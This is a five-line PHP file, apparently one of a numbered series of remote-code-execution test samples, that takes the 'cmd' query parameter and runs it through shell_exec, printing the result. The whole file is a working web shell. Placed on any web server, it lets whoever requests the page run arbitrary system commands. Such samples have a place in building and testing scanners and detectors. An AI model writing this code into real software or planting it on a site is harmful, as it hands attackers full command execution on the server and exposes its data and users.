<?php
// RCE test variation #283
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>